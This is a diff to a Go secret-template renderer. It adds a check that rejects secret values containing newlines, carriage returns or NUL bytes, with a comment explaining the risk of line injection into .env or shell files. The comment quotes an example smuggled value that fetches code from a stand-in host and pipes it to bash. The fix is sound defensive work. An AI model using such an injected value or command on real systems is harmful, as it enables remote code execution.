@@ -55,6 +55,26 @@ func Render(tmpl string, resolve Resolver) (string, error) {
 			if err != nil {
 				return "", fmt.Errorf("resolve %q: %w", ref, err)
 			}
+			// This package is a raw, format-agnostic substitution engine: it has no idea
+			// whether the caller's template is a .env file, a YAML/JSON document, or a
+			// shell script, so it can't apply format-specific escaping (quoting a YAML
+			// scalar, JSON-string-escaping, shell-quoting, ...). What every one of those
+			// targets shares, though, is that an embedded newline/CR turns one substituted
+			// value into multiple *lines* of output, and the documented use case
+			// (internal/cli/secret/render.go) is exactly "write this straight to a .env/
+			// config file, which may later be sourced". A secret's value is set by
+			// whoever has write access to that one secret — who may be far less trusted
+			// than the template's author or the file's eventual consumer — so a value
+			// containing "\ncurl evil|bash\n#" would silently smuggle extra executable
+			// lines into the rendered file. Rather than silently stripping/altering the
+			// secret value (surprising, and could itself corrupt a legitimately multi-line
+			// value), reject the render outright: this matches Render's existing all-or-
+			// nothing failure model for a resolver error, and forces the operator to
+			// notice rather than silently ship injected content. NUL is rejected for the
+			// same reason (embedded NUL truncates/corrupts many downstream parsers).
+			if strings.ContainsAny(val, "\n\r\x00") {
+				return "", fmt.Errorf("resolve %q: secret value contains a newline, carriage return, or NUL byte and cannot be safely substituted into a single-line template output", ref)
+			}
 			b.WriteString(val)
 			i += len(marker) + end + 1 // past the closing '}'
 			continue
